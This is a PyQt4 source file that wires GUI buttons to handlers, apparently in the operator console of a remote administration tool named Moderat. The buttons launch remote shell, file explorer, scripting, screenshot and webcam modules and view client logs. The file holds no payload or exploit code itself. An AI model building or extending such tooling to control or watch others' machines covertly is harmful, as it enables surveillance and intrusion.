from PyQt4.QtGui import *
from PyQt4.QtCore import *

class moderatTriggers:

    def __init__(self, moderat):

        self.moderat = moderat

        # Connect & Disconnect triggers
        self.moderat.connectButton.clicked.connect(self.moderat.on_connect_to_server)
        self.moderat.disconnectButton.clicked.connect(self.moderat.on_moderator_connect_fail)
        #self.moderat.settingsButton.clicked.connect(self.moderat.run_settings)

        # Online Menu Triggers
        self.moderat.viewLogsButton.clicked.connect(self.moderat.view_logs)
        self.moderat.logSettingsButton.clicked.connect(self.moderat.set_logs_settings)
        self.moderat.setAliasButton.clicked.connect(self.moderat.set_alias)
        self.moderat.updateSourceButton.clicked.connect(self.moderat.update_source)
        self.moderat.shellButton.clicked.connect(lambda: self.moderat.execute_module(module='shell'))
        self.moderat.explorerButton.clicked.connect(lambda: self.moderat.execute_module(module='explorer'))
        self.moderat.scriptingButton.clicked.connect(lambda: self.moderat.execute_module(module='scripting'))
        self.moderat.screenshotButton.clicked.connect(lambda: self.moderat.execute_module(module='desktop'))
        self.moderat.webcamButton.clicked.connect(lambda: self.moderat.execute_module(module='webcam'))
        self.moderat.setModeratorButton.clicked.connect(self.moderat.set_moderator)

        # Offline Menu Triggers
        self.moderat.viewOfflineLogsButton.clicked.connect(lambda: self.moderat.view_logs(tab=1))

        # Moderators Menu Triggers
        self.moderat.getModeratorsButton.clicked.connect(self.moderat.get_moderators)
        self.moderat.addModeratorButton.clicked.connect(self.moderat.create_moderator)
